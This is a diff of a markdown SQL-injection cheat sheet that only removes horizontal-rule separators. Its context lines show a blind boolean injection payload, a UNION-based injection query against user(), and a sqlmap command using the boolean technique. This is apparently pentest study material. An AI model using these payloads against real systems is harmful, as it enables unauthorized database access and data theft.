@@ -24,7 +24,7 @@ We can iterate over letters of the username by using payloads such as
 ' or substring(user(), 2, 1) = 'b
 ```
 
-***
+
 
 ### Union Based SQLi
 
@@ -42,7 +42,7 @@ Select description from items where id='' UNION Select user(); -- -
 1. use NULL to find out no of columns
 2. use different data types to find out type of data returned
 
-***
+
 
 ### SQLMap
 
@@ -65,4 +65,3 @@ sqlmap -u <url> --data=<POST STRING> -p parameter --technique=B
 
 * technique used is boolean
 
-***
